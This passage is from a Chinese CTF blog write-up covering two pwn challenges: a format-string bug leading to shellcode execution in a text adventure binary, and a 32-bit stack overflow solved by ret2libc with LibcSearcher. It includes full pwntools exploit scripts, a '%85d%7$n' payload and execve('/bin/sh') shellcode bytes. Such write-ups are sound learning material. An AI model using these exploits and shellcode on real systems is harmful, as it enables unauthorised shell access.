alt></p></li><li><p>运行一下看看</p><p>是一个游戏，没啥内容，比较长懒得截图了。。。。。</p></li><li><p>丢到IDA看看</p><ul><li><p>先看到了main函数</p><p><img src="https://ae01.alicdn.com/kf/H6fabf6af17184f6db0de96733d03087fE.jpg" alt></p></li></ul></li></ul><h3 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h3><ul><li><p>寻找flag的思路</p><p>先调用用了sub_400996()这个函数，进去看看。</p><pre class="line-numbers language-C"><code class="language-C">  unsigned __int64 sub_400996()  {    unsigned __int64 v0; // ST08_8    v0 = __readfsqword(0x28u);    puts("Welcome to Dragon Games!");    puts(off_603010);    return __readfsqword(0x28u) ^ v0;  }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>​      没什么用，就输出了一句话</p><ul><li><p>接着是给v3分配了8个字节的空间，又将v3赋值给了v4, 也就是v4其实就是v3了现在，*v3 = v3[0] = 68， v3[1] = 85, 下面由输出了v3的地址，莫名其面为什么要告诉我们v3的地址呢，肯定是要用到的。</p></li><li><p>主要的内容是在函数sub_400D72()中执行的，于是乎查看其中的内容</p><pre class="line-numbers language-c"><code class="language-c">  <span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_400D72</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-20h]</span>    <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>    v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What should your character's name be:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0xC</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Creating a new player."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sub_400A7D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sub_400BB9</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sub_400CA6</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hei! What's up!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  执行了输入名字，接着对名字的长度进行了判断，长度小于0xC便进行 if 里面的操作，否则就结束了程序。if里面执行了三个函数，分别查看一下</p></li><li><p>sub_400A7D()</p><pre class="line-numbers language-c"><code class="language-c">  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token string">"east"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token string">"east"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"hei! I'm secious!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"So, where you will go?:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token string">"east"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token string">"up"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token function">sub_4009DD</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"YOU KNOW WHAT YOU DO?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  输出了一堆东西，进入了一个判断循环，只有当我们输入了”east” 才给我们退出。</p></li><li><p>sub_400BB9()</p><pre class="line-numbers language-c"><code class="language-c">  <span class="token keyword">unsigned</span> __int64 <span class="token function">sub_400BB9</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-7Ch]</span>    __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-78h]</span>    <span class="token keyword">char</span> format<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-70h]</span>    <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+78h] [rbp-8h]</span>    v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v2 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You travel a short distance east.That's odd, anyone disappear suddenly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">", what happend?! You just travel , and find another hole"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You recall, a big black hole will suckk you into it! Know what should you do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"go into there(1), or leave(0)?:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"A voice heard in your mind"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%ld"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your wish is"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span> <span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I hear it, I hear it...."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v4<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  只有我们输入了<code>1</code>才会执行 if 里面的语句，还有<code>printf(&amp;format, &amp;format)</code> 存在了一个明显的格式化字符串漏洞。暂且还不知道如何利用它，先放着</p></li><li><p>sub_400CA6()</p><pre class="line-numbers language-c"><code class="language-c">  <span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_400CA6</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>a1<span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rsi</span>    <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>    v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Dragon say: HaHa! you were supposed to have a normal"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"RPG game, but I have changed it! you have no weapon and "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"skill! you could not defeat me !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"That's sound terrible! you meet final boss!but you level is ONE!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>a1 <span class="token operator">==</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wizard: I will help you! USE YOU SPELL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v1 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>v1<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  发现了一个特别有用的东西</p><blockquote><p>  void (__fastcall <em>)(_QWORD, void </em>))v1)(0LL, v1);       </p></blockquote><p>  记住只要看见这样的句子，就知道是吧v1强制转化成一个函数指针，然后调用这个函数，那么我们就可以利用前面的read，把我们想要执行的命令(shellcode)写入到v1中，然后程序就可以执行shellcode。想要执行 if 里的语句我们就要让a1[0] = a1[1]， a1的根源就是v4，v4 = v3,  那么只要想办法让v3[0] = v3[1]  就行了，我们是知道v3的地址的，而且还有格式化字符串漏洞，那就要先看看v3的偏移量。</p></li><li><p>查看v3的偏移量</p><p>  <img src="https://ae01.alicdn.com/kf/H13f6f7044a1f4113bd75c864d135fca2j.jpg" alt></p><p>  12的16进制表示就是<code>c</code>，查一偏移量为7</p></li><li><p>于是乎我们只要构建payload = “%85d%7$n”, 首先先将v3的地址赋值给v2，然后再将利用格式化字符出漏洞将其赋值为85。</p></li><li><p>构建exp</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">51451</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"secret[0] is "</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#截取到返回的v3(v4)的地址。</span><span class="token keyword">print</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What should your character's name be:"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"nibaba"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"So, where you will go?east or up?:"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"east"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"go into there(1), or leave(0)?:"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>int<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%85d%7$n"</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"I will help you! USE YOU SPELL"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># system("/bin/sh") 的shellcode编码就是 \x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>运行结果，</p><p><img src="https://ae01.alicdn.com/kf/H69c114b3ec204297859ef211c4361b273.jpg" alt></p></li></ul></li><li><p>常见命令的shellcode编码可以从这个<a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">数据库进行查询</a>。</p></li></ul><blockquote><p>搞了2个半小时,emmmm终于搞完了………………………….,   加油啊,啊啊啊啊啊啊啊…..</p></blockquote><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><code>libc!libc!这次没有system，你能帮菜鸡解决这个难题么?</code></p><h3 id="基操-8"><a href="#基操-8" class="headerlink" title="基操"></a>基操</h3><ul><li><p>查看文件信息。下载的文件是一个压缩包，用winrar解压发现的到一个文件，结果拖到kail虚拟机里发现还是一个压缩包，提取文件的到一个level3的文件和一个libc文件，查看level的信息</p><p><img src="https://ae01.alicdn.com/kf/H4c888d865c624af4810ee60c163a00ebl.jpg" alt></p><p>32位的ELF文件，开启了NX保护，也就是说栈不可执行，一次shellcode基本没有用武之地了。</p></li><li><p>丢到IDA里看看</p><p><img src="https://ae01.alicdn.com/kf/H0fa45aebf3c34a14b41476028f5ae56fL.jpg" alt></p><p>main函数里没什么东西，</p></li></ul><h3 id="分析过程-8"><a href="#分析过程-8" class="headerlink" title="分析过程"></a>分析过程</h3><ul><li><p>接着查看vulnerable_function()函数</p><p><img src="https://ae01.alicdn.com/kf/Hd83c69e71d6540ff9176f289a8a99762y.jpg" alt></p><p>也没什么，看似没有栈溢出漏洞。但是呢</p></li><li><p>我们发现buf申请了0x88个byte的空间，0x88的buf + 0x4的EBP。但是我们read读取的确是0x100个byte的空间，存在明显的栈溢出。但是呢栈不可执行，此时我们就要用到了ROP攻击了。</p><p><img src="https://ae01.alicdn.com/kf/He776bf0f958a488597edf3c275297758q.jpg" alt></p><p><img src="https://ae01.alicdn.com/kf/H9a7e68a48b0849578820674534e82249I.jpg" alt></p></li><li><p>再程序中找看看有没有现成的systme函数和’/bin/sh’字符串。<code>shift+f12</code> 查看字符串发现没有‘/bin/sh’，但是呢我们发现程序加载了动态函数库libc动态链接库</p><p><img src="https://ae01.alicdn.com/kf/H8d05c4a2275b4d5d864a6f08d3ab8a5dO.jpg" alt></p><p>于是乎我们就是要找到systme函数和字符串’/bin/sh’在映射到level3程序中的地址，然后进行ROP攻击。</p></li><li><p>但是如何获取到本来不直接在程序中的函数和参数的地址呢。这里就要说道说道了</p><ul><li><p>libc文件</p><p>首先在程序开始运行的时候libc文件是要加载到内存中，以后当程序需要调用相关库函数是就会依据    plt-got表对函数的实际地址进行映射，相当于调用时会通过plt-got表辗转跳转至真正的函数地址进行执行。</p></li><li><p>PLT和GOT表</p><p><code>PLT</code>: 内部函数表（Procedure Linkage Table，过程链接表）是LinuxELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定</p><p><code>GOT</code>: 全局函数表（Global Offset Table, 全局偏移表）是LinuxELF文件用于定位全局变量和函数的一个表。</p></li><li><p>延迟绑定</p><pre class="line-numbers language-c"><code class="language-c">实际程序调用了libc库中的write函数。在PLT表中的条目为write@plt。。在GOT表中的条目为write@got当程序第一次调用write函数时：<span class="token number">1</span><span class="token punctuation">.</span> 跳转到PLT表<span class="token number">2</span><span class="token punctuation">.</span> 跳转到GOT表<span class="token number">3</span><span class="token punctuation">.</span> 调用patch write@got 将write的真实地址填充到write@got中当程序第二次调用write函数时：<span class="token number">1</span><span class="token punctuation">.</span> write@plt<span class="token number">2</span><span class="token punctuation">.</span> write@got<span class="token number">3</span><span class="token punctuation">.</span> 得到<span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span>的真实地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是只要调用了函数那么GOT表存的就是函数的真实地址。</p></li><li><p>我们可以通过libc文件的到函数在文件中的基地址，而函数在内存中的地址是基地址的平行映射，也就是所libc文件中的所有函数的<code>基地址</code>和<code>真实地址</code>(内存中的地址)的偏移量是一样的。</p><p>因此我们可以通过计算已知函数的偏移量来得知我们需要的函数的偏移量，而所需函数的基地址可以直接通过libc文件（或者通过LibcSearcher 库找到对应的版本）获取。</p></li></ul></li><li><p>解体思路</p><ul><li>我们是已知程序调用了libc中的write函数，那么我们就可以先通过write函数获取偏移量，利用read函数的栈溢出漏洞。</li><li>然后再利用read函数的漏洞传入我们要调用的函数和参数的地址</li><li>整个过程需要利用两次read函数，所以第一次利用的时候还要设置函数的返回地址为<code>vulnerable_function</code>的地址，于是或才有了第二次read函数调用。</li><li>LibcSearcher<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">源码与使用</a></li><li>payload1：填充buf，使其溢出；write的plt语句(用来调用write函数)；需要再次执行的函数地址；文件描述符；write()的got表地址；写入长度。</li><li>得到write返回的write的got表地址（也就是真实(内存)地址，根据真实地址通过LibcSearcher库找到对应的libc版本</li><li>算出偏移量，system()的地址，/bin/sh的地址，构建payload2：填充buf；system()地址；返回地址随意填；参数地址</li></ul></li><li><p>构建exp</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span> <span class="token number">57131</span><span class="token punctuation">)</span>e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"../mid_file/level3"</span><span class="token punctuation">)</span>write_got <span class="token operator">=</span> e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 获取write()函数的got语句</span>write_plt <span class="token operator">=</span> e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 获取write()函数的plt语句</span>vuln_addr <span class="token operator">=</span> e<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"vulnerable_function"</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 获取函数地址</span><span class="token comment" spellcheck="true">#payload1：填充buf，使其溢出；write的plt语句(用来调用write函数)；需要再次执行的函数地址；文件描述符；write()的got表地址；写入长度。</span>payload1 <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#得到write返回的write的got表地址（也就是真实(内存)地址）</span>write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"write addr:"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#根据真实地址通过LibcSearcher库找到对应的libc版本</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"write"</span><span class="token punctuation">,</span> write_addr<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 获取偏移量</span>sys_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 基地址 + 偏移量</span>bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 基地址 + 偏移量</span><span class="token comment" spellcheck="true">#payload2：填充buf；system()地址；返回地址随意填；参数地址</span>payload2 <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>运行结果：</p><p><img src="https://ae01.alicdn.com/kf/H71538eb23e2f4042b7954b0c039fda5fd.jpg" alt></p><ul><li>参考资料：<ul><li><a href="http://virgin-forest.top/2019/05/18/ctf-xman-level3-libcsearcher/" target="_blank" rel="noopener">Writeup</a></li><li><a href="https://blog.csdn.net/u011822516/article/details/20001765" target="_blank" rel="noopener">详细解析ESP寄存器与EBP寄存器</a></li><li><a href="[https://introspelliam.github.io/2017/08/03/pwn/got%E3%80%81plt%E8%A1%A8%E4%BB%8B%E7%BB%8D/](https://introspelliam.github.io/2017/08/03/pwn/got、plt表介绍/)">got、plt表介绍</a></li><li><a href="https://zszcr.github.io/2018/09/16/2018-9-16-pwnenv/" target="_blank" rel="noopener">pwn工具集</a><blockquote><p>说明：有些博客将本文中的基地址称之为真实地址，个人认为不太恰当，程序执行过程中内存中的地址才应该是真实地址，所以本文将其再内存中的地址称之为基地址，而将libc中函数的地址称之为基地址。</p></blockquote></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 竞赛 </tag>
            
            <tag> pwn </tag>
            
